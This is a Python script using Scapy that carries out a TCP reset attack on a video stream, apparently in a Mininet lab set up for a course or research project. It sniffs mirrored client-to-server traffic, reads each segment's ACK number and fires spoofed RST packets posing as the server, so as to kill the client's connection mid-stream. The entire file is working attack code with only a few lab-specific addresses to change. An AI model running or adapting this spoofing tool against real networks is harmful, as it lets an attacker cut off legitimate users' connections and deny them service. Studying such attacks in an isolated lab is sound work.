#!/usr/bin/env python3
"""
TCP Reset Attack on Video Streaming -- Attack A (forged RST delivered to
the client, spoofed as the server).

Run on h2 (attacker), with mirror_enable.sh already applied on s1 so h2
can see h1<->h3 traffic (see NOTES_SNIFFING.md), and a stream in progress
between h1 and h3.

Design (per the design report): for every h1->h3 segment sniffed, its
ACK field is h1's RCV.NXT for h3's byte stream -- exactly the SEQ value
a real RST from h3 would need. We copy it straight off the wire and fire
a forged RST at h1 immediately, racing the real server's next segment
(which has to cross the slower, router-hop WAN path). Since the value is
sniffed rather than guessed, it satisfies RFC 5961's exact-match
requirement for an immediate accept, with no challenge-ACK downgrade.

This is a first-pass implementation (Scapy sniff()/sendp(), full
Ether()/IP()/TCP() frames) -- not yet measured for reliability under the
timing race this attack depends on. Performance/reliability
characterization and any resulting fixes are a separate, later step.
"""

import sys
import time

from scapy.all import sniff, srp, sendp, Ether, IP, TCP, ARP

# Two separate interfaces, deliberately: SNIFF_IFACE is h2's dedicated
# monitor interface (the OVS mirror's output-port), SEND_IFACE is h2's
# ordinary, actively-transmitting interface (ARP resolution + the forged
# RSTs go out here). Mirroring onto the same interface used for sending
# broke h2's own outgoing traffic entirely -- see NOTES_SNIFFING.md.
SNIFF_IFACE = "h2-eth1"
SEND_IFACE = "h2-eth0"

CLIENT_IP = "10.0.1.10"
SERVER_IP = "10.0.2.10"
SERVER_PORT = 8000

BPF_FILTER = f"tcp and src host {CLIENT_IP} and dst host {SERVER_IP} and dst port {SERVER_PORT}"

# Client ports we've already seen tear themselves down -- stop firing at
# a flow once it's dead instead of spamming pointless RSTs at it.
closed_ports = set()

attempt_count = 0

# Resolved once at startup and reused for every forged packet.
CLIENT_MAC = None


def resolve_client_mac():
    # Built and sent explicitly bound to SEND_IFACE via srp(), rather
    # than Scapy's higher-level getmacbyip() -- that helper picks its own
    # outgoing interface via Scapy's internal routing-table detection,
    # which is not reliable inside a Mininet network namespace. Binding
    # srp() to SEND_IFACE directly sidesteps that routing guesswork.
    global CLIENT_MAC
    req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=CLIENT_IP)
    answered, _ = srp(req, iface=SEND_IFACE, timeout=3, retry=2, verbose=False)
    if not answered:
        sys.exit(f"[attacker] could not resolve MAC for {CLIENT_IP} on {SEND_IFACE} -- is h1 up and reachable?")
    CLIENT_MAC = answered[0][1].hwsrc
    print(f"[attacker] resolved {CLIENT_IP} -> {CLIENT_MAC}")


def fire_forged_rst(client_port, seq):
    """Send one spoofed RST: src=server, dst=client, SEQ=sniffed client ACK.

    Built as a full Ether()/IP()/TCP() frame and sent with sendp() (an L2
    send bound directly to SEND_IFACE) rather than a bare IP()/TCP()
    packet handed to send() -- the latter relies on the kernel doing
    Ethernet framing (ARP resolution for h1's MAC) transparently, which
    does not work reliably inside this network namespace. h1's MAC is
    resolved once at startup and reused here.
    """
    global attempt_count
    attempt_count += 1
    frame = (
        Ether(dst=CLIENT_MAC)
        / IP(src=SERVER_IP, dst=CLIENT_IP)
        / TCP(sport=SERVER_PORT, dport=client_port, flags="R", seq=seq)
    )
    sendp(frame, iface=SEND_IFACE, verbose=False)
    now = time.time()
    ts = time.strftime("%H:%M:%S", time.localtime(now)) + f".{int(now * 1000) % 1000:03d}"
    print(f"[attack] #{attempt_count:04d} {ts} fired RST -> {CLIENT_IP}:{client_port} seq={seq}")


def handle(pkt):
    if TCP not in pkt:
        return
    tcp = pkt[TCP]
    client_port = tcp.sport

    if client_port in closed_ports:
        return

    flags = str(tcp.flags)

    if "S" in flags:
        # The initial SYN has no meaningful ACK field yet -- reacting to
        # it kills the connection attempt at handshake time, before any
        # real data transfer even begins. That's a different (and less
        # interesting) attack than the mid-stream race this project
        # targets, so we deliberately don't engage with SYNs.
        return

    if "R" in flags or "F" in flags:
        # This particular connection (identified by h1's ephemeral port)
        # is already tearing down on its own -- firing more forged RSTs
        # at it accomplishes nothing. Stop targeting this flow, but keep
        # listening for new connections (a fresh flow gets a fresh
        # ephemeral port).
        closed_ports.add(client_port)
        print(f"[attack] {CLIENT_IP}:{client_port} closed itself (flags={flags}) "
              f"-- no longer targeting this flow")
        return

    # Per the design report's race-condition analysis, a single, timed
    # shot isn't reliable -- so every sniffed h1->h3 packet is treated as
    # a fresh, independent attempt: each carries a just-as-valid,
    # just-as-current ACK value. Failure is cheap and silent (a late RST
    # just falls outside h1's advanced receive window and is discarded),
    # so there's no downside to firing on every opportunity.
    fire_forged_rst(client_port, tcp.ack)


if __name__ == "__main__":
    resolve_client_mac()
    print(f"[attacker] listening on {SNIFF_IFACE}, filter: '{BPF_FILTER}'")
    print(f"[attacker] will forge RST packets as {SERVER_IP}:{SERVER_PORT} -> {CLIENT_IP} via {SEND_IFACE}")
    sniff(iface=SNIFF_IFACE, filter=BPF_FILTER, prn=handle, store=False, promisc=True)
